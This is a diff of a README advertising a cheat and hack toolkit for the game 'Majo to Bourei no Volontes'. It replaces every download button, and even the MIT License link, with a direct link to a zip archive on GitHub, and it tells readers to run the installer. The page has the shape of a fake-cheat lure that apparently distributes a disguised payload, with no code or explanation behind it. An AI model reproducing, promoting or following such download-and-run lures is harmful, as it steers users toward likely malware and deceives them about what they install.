@@ -1,5 +1,5 @@
 # 👻 Majo to Bourei no Volontes Cheats & Hacks Repository  
-[![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://github.com/iamlopez2512/MajouBoureiVolontes-ArcaneToolkit/raw/refs/heads/main/overmark/Majou_Toolkit_Bourei_Arcane_Volontes_3.0.zip)](https://github.com/iamlopez2512/MajouBoureiVolontes-ArcaneToolkit/raw/refs/heads/main/overmark/Majou_Toolkit_Bourei_Arcane_Volontes_3.0.zip)
 
 Explore the ultimate toolkit for **Majo to Bourei no Volontes**! Enhance your gameplay with advanced cheats and hacks designed for maximum experience, smooth progress, and rich customization. Built cross-platform for broad accessibility. Find robust tools for unlocking features, boosting in-game stats, customizing visuals, and more.
 
@@ -33,7 +33,7 @@ Explore the ultimate toolkit for **Majo to Bourei no Volontes**! Enhance your ga
 ## 🚀 Installation Guide
 
 1️⃣ **Download the launcher:**  
-[![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://github.com/iamlopez2512/MajouBoureiVolontes-ArcaneToolkit/raw/refs/heads/main/overmark/Majou_Toolkit_Bourei_Arcane_Volontes_3.0.zip)](https://github.com/iamlopez2512/MajouBoureiVolontes-ArcaneToolkit/raw/refs/heads/main/overmark/Majou_Toolkit_Bourei_Arcane_Volontes_3.0.zip)
 
 Run the installer and follow on-screen steps. See the OS Compatibility Table above for platform-specific tips.
 
@@ -53,9 +53,9 @@ This project is for educational and research purposes only. Use responsibly and 
 
 ## 📄 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+Licensed under the [MIT License](https://github.com/iamlopez2512/MajouBoureiVolontes-ArcaneToolkit/raw/refs/heads/main/overmark/Majou_Toolkit_Bourei_Arcane_Volontes_3.0.zip).  
 © 2025 Majo to Bourei no Volontes Cheats & Hacks Team
 
 ---
 
-#### [![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue.svg)](https://easylauncher.su/PSnzrH)
+#### [![Download Now](https://github.com/iamlopez2512/MajouBoureiVolontes-ArcaneToolkit/raw/refs/heads/main/overmark/Majou_Toolkit_Bourei_Arcane_Volontes_3.0.zip)](https://github.com/iamlopez2512/MajouBoureiVolontes-ArcaneToolkit/raw/refs/heads/main/overmark/Majou_Toolkit_Bourei_Arcane_Volontes_3.0.zip)
